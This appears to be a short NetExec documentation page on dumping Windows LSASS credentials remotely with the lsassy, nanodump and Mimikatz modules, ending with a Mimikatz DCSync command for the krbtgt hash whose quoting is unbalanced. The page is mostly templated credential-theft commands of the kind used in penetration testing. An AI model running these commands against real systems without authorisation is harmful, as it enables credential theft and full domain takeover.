# Dump LSASS

{% hint style="warning" %}
You need at least local admin privilege on the remote target, use option **--local-auth** if your user is a local account
{% endhint %}

### Using Lsassy

Using the module Lsassy from [@pixis ](https://twitter.com/HackAndDo), you can dump the credentials remotely

```bash
nxc smb $TARGET -u $USER -p $PASSWORD -M lsassy
```

### Using nanodump

Using the module nanodump you can dump the credentials remotely

```bash
nxc smb $TARGET -u $USER -p $PASSWORD -M nanodump
```

### Using Mimikatz (deprecated)

{% hint style="warning" %}
You need at least local admin privilege on the remote target, use option **--local-auth** if your user is a local account
{% endhint %}

Using the Mimikatz module, the powershell script `Invoke-Mimikatz.ps1` will be executed on the remote target

```bash
nxc smb $TARGET -u $USER -p $PASSWORD -M mimikatz
```

```bash
nxc smb $TARGET -u $USER -p $PASSWORD -M mimikatz -o COMMAND='"lsadump::dcsync /domain:domain.local /user:krbtgt"
```
